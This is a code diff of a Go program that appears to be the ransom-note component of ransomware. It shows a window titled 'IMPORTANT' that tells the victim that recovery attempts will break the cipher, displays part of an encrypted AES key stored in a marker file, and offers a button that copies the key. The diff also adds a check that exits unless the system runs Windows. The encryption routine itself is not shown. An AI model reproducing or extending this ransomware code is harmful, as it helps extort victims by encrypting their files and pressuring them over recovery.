@@ -3,6 +3,7 @@ package main
 import (
 	"fmt"
 	"os"
+	"runtime"
 
 	gui "github.com/gen2brain/raylib-go/raygui"
 	rl "github.com/gen2brain/raylib-go/raylib"
@@ -15,38 +16,40 @@ const (
 
 func main() {
 	var (
-		akey                  []byte
+		aeskeyEncrypted       []byte
 		textBoxText           string = ""
 		textBoxEditMode       bool   = false
 		showSuccessMessageBox bool   = false
 		showFailMessageBox    bool   = false
 	)
 
-	if _, err := os.Stat(marker); os.IsNotExist(err) {
-		f, err := os.Create(marker)
-		if err != nil {
-			fmt.Println("Error creating marker:", err)
-			return
-		}
-		akey, err = encryptAES()
-		if err != nil {
-			panic(err)
-		}
-		defer f.Close()
-		f.WriteString(string(akey))
-	} else {
-		akey, err = os.ReadFile(marker)
-		if err != nil {
-			fmt.Println("error reading marker: ", err)
-			return
-		}
-		fmt.Println("marker found:", string(akey))
+	if runtime.GOOS != "windows" {
+		os.Exit(1)
 	}
 
 	rl.SetTraceLogLevel(rl.LogWarning)
 	rl.InitWindow(750, 600, "IMPORTANT")
 
-	rl.SetTargetFPS(60)
+	if _, err := os.Stat(marker); os.IsNotExist(err) {
+		aeskeyEncrypted, err = encryptAES()
+		if err != nil {
+			panic(err)
+		}
+		f, err := os.Create(marker)
+		if err != nil {
+			fmt.Println("Error creating marker:", err)
+			return
+		}
+		defer f.Close()
+		f.WriteString(string(aeskeyEncrypted))
+	} else {
+		aeskeyEncrypted, err = os.ReadFile(marker)
+		if err != nil {
+			fmt.Println("error reading marker: ", err)
+			return
+		}
+		fmt.Println("marker found:", string(aeskeyEncrypted))
+	}
 
 	for !rl.WindowShouldClose() {
 		rl.BeginDrawing()
@@ -65,10 +68,10 @@ func main() {
 		rl.DrawText("the cipher and decryption will be impossible.", 40, 385, 20, rl.DarkGray)
 		rl.DrawText("2. Trying to recover with any software can also break the cipher", 25, 415, 20, rl.DarkGray)
 		rl.DrawText("and file recovery will become a problem.", 40, 445, 20, rl.DarkGray)
-		rl.DrawText("key: "+string(akey)[:13]+"...", 40, 485, 20, rl.DarkGray)
+		rl.DrawText("key: "+string(aeskeyEncrypted)[:13]+"...", 40, 485, 20, rl.DarkGray)
 
 		if gui.Button(rl.Rectangle{X: 280, Y: 485, Width: 25, Height: 25}, gui.IconText(gui.ICON_FILE_COPY, "")) {
-			clipboard.Write(clipboard.FmtText, akey)
+			clipboard.Write(clipboard.FmtText, aeskeyEncrypted)
 		}
 
 		gui.SetStyle(gui.DEFAULT, gui.TEXT_SIZE, 20)
